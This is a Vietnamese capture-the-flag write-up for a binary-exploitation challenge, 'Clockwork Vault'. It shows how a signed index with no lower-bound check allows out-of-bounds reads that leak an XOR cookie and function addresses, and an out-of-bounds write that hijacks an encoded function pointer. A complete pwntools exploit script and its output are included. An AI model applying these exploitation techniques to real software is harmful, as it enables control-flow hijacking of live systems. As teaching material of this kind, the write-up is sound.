# Clockwork Vault (Pwn)

## 1. Thông tin tổng quan
- **Category:** Pwn (Binary Exploitation)
- **Difficulty:** Medium
- **Tags:** OOB Read/Write, Missing Lower-Bound Check, Global Struct Array, Encoded Function Pointer, Control-Flow Hijack

## 2. Đề bài
> *(Không lưu lại nguyên văn đề bài từ platform, mô tả dưới đây được viết lại dựa trên hành vi thực tế của chương trình.)*

Chương trình `clockwork_vault` mô phỏng một "cơ chế đồng hồ" gồm 8 slot (mechanism) chứa trong một mảng cấu trúc toàn cục. Người chơi có 3 lựa chọn qua menu:
1. **Inspect** — đọc thông tin (`setting`, `routine`) của một slot theo index.
2. **Retune** — ghi lại `setting` và `routine` của một slot theo index.
3. **Cycle** — kích hoạt "bảo trì": nếu điều kiện đúng, chương trình gọi một con trỏ hàm được lưu (đã mã hoá) trong slot.

Mục tiêu: lấy flag nằm trong `flag.txt`.

**File đính kèm:**
- `clockwork_vault` — ELF 64-bit, PIE, NX enabled, Full RELRO, **No canary**, not stripped (có debug_info).

## 3. Quá trình phân tích

Đọc `main()`, chương trình chỉ có 3 lựa chọn: `inspect_slot` (đọc 1 slot), `retune_slot` (ghi 1 slot), và `cycle` (sink). Cả hai hàm đọc/ghi đều tính con trỏ slot theo cùng một công thức:
```c
idx = read_int();
if (idx > 7) { puts("out of range"); return; }
slot = (mechanism_t *)((char *)&slots + (idx + 2) * 0x20);
```
Điểm đáng chú ý nhất: điều kiện chặn chỉ có `idx <= 7`, không hề có `idx >= 0`. Vì `idx` là `int` có dấu, một giá trị âm (ví dụ `-2`) vẫn lọt qua `jle`, và phép nhân `(idx + 2) * 0x20` cho ra một con trỏ nằm *trước* mảng `slots[]` — `inspect_slot`/`retune_slot` thực chất là một cặp đọc/ghi tùy ý (OOB read/write), không chỉ giới hạn trong 8 slot hợp lệ.

Vậy vùng nhớ ngay trước `slots` chứa gì? `setup()` cho câu trả lời:
```asm
lea  rax, [slots]
shr  rax, 0xc
xor  rax, 0x3141592653589793
mov  [service_cookie], rax
mov  [slots+0x10], rax        ; slots[0].setting = service_cookie
...
xor  rax, idle_cycle
mov  [slots+0x38], rax        ; slots[1].routine = cookie ^ idle_cycle
...
xor  rax, trigger_alarm
mov  [slots + i*0x20 + 0x18], rax   ; slots[2..9].routine = cookie ^ trigger_alarm
```
`service_cookie` chỉ là `(&slots >> 12) ^ hằng_số` — tất định theo PIE base chứ không random theo runtime — và nó tự lưu ngay tại `slots[0].setting`. Với `idx = -2` thì `(idx+2)*0x20 = 0`, đúng raw index 0, nên `inspect_slot(-2)` leak thẳng ra cookie. Tương tự `idx = -1` (raw index 1) leak `cookie ^ idle_cycle`, `idx = 0` (raw index 2) leak `cookie ^ trigger_alarm`. Chỉ với option 1 và vài index âm, ta có ngay cookie và 2 địa chỉ hàm hợp lệ đã "giải mã" được.

`cycle()` — sink của bài — làm gì với vùng nhớ đó:
```asm
cmp  qword [slots+0x30], 0x43414c4942524154   ; "CALIBRAT" (ASCII, đọc little-endian)
jne  skip
mov  rax, [slots+0x38]
xor  rax, [service_cookie]
call rax
```
`slots+0x30`/`slots+0x38` chính là raw index 1 — đúng struct mà `retune_slot(-1)` cho phép ghi đè toàn quyền. Sink thực chất chỉ là `call(slots[1].routine ^ cookie)`, gate bằng cách so khớp một hằng số ASCII.

**Hướng giải quyết:**
1. Leak `service_cookie`, `idle_cycle`, `trigger_alarm` bằng `inspect_slot` với index âm.
2. Suy ra địa chỉ hàm in flag (`open_vault`) mà không cần offset cứng nào: `idle_cycle`, `trigger_alarm`, `open_vault` là 3 stub liên tiếp, cùng kích thước 0x16 byte trong `.text`, nên `open_vault = 2×trigger_alarm − idle_cycle` — đúng với mọi PIE base, kể cả khi remote build lại binary ở dạng non-PIE.
3. Dùng `retune_slot(-1)` ghi đè đúng struct mà `cycle()` kiểm tra: `setting = "CALIBRAT"` để qua gate, `routine = open_vault ^ cookie` để sau khi XOR lại đúng bằng `open_vault`.
4. Gọi `cycle` → `call(open_vault)` → in flag, không cần biết địa chỉ libc hay dựng ROP gì cả.

## 4. PoC

```python
#!/usr/bin/env python3
from pwn import *

context.binary = ELF('./clockwork_vault', checksec=False)
context.log_level = 'info'

MAGIC = 0x43414c4942524154   # "CALIBRAT" - gate mà cycle() kiểm tra ở slots[1].setting


def start():
    return process(context.binary.path)


def menu(p, choice):
    p.sendlineafter(b'> ', str(choice).encode())


def inspect(p, index):
    """opt 1: trả về (setting, routine) của slots[index+2] (raw)."""
    menu(p, 1)
    p.sendlineafter(b'Mechanism index:', str(index).encode())
    p.recvuntil(b'Setting: 0x')
    setting = int(p.recvline().strip(), 16)
    p.recvuntil(b'Encoded routine: 0x')
    routine = int(p.recvline().strip(), 16)
    return setting, routine


def retune(p, index, setting, routine):
    """opt 2: ghi setting/routine của slots[index+2] (raw)."""
    menu(p, 2)
    p.sendlineafter(b'Mechanism index:', str(index).encode())
    p.sendlineafter(b'New setting:', str(setting).encode())
    p.sendlineafter(b'New encoded routine:', str(routine).encode())


def cycle(p):
    """opt 3: sink -> call(slots[1].routine ^ service_cookie)."""
    menu(p, 3)


def exploit():
    p = start()

    # 1) OOB read với index âm (không có bound dưới):
    #    -2 -> slots[0].setting = service_cookie
    #    -1 -> slots[1].routine = cookie ^ idle_cycle
    #     0 -> slots[2].routine = cookie ^ trigger_alarm
    service_cookie = inspect(p, -2)[0]
    idle_cycle     = inspect(p, -1)[1] ^ service_cookie
    trigger_alarm  = inspect(p,  0)[1] ^ service_cookie
    log.info('service_cookie = %#x', service_cookie)
    log.info('idle_cycle     = %#x', idle_cycle)
    log.info('trigger_alarm  = %#x', trigger_alarm)

    # 2) open_vault nằm ngay sau trigger_alarm, 2 stub liền trước cùng size
    #    -> open_vault = 2*trigger_alarm - idle_cycle (không cần hardcode offset)
    open_vault = 2 * trigger_alarm - idle_cycle
    log.success('open_vault = %#x', open_vault)

    # 3) OOB write: retune(-1) trúng slots[1] (đúng struct mà cycle() đọc)
    retune(p, -1, MAGIC, open_vault ^ service_cookie)

    # 4) Kích hoạt sink -> call open_vault() -> in flag
    cycle(p)

    print(p.recvall(timeout=3).decode(errors='ignore'))
    p.close()


if __name__ == '__main__':
    exploit()
```

**Output:**
```
[*] service_cookie = 0x314159205a3a266d
[*] idle_cycle     = 0x60962b1fb35c
[*] trigger_alarm  = 0x60962b1fb372
[+] open_vault = 0x60962b1fb388
Cycling the maintenance core...
The final lock disengages.
Flag: grodno{fake_flag}
```

## 5. Flag
```
grodno{fake_flag}
```
*(Flag thật đã submit trực tiếp lúc thi qua service của BTC, không lưu lại; giá trị trên chỉ minh hoạ định dạng.)*
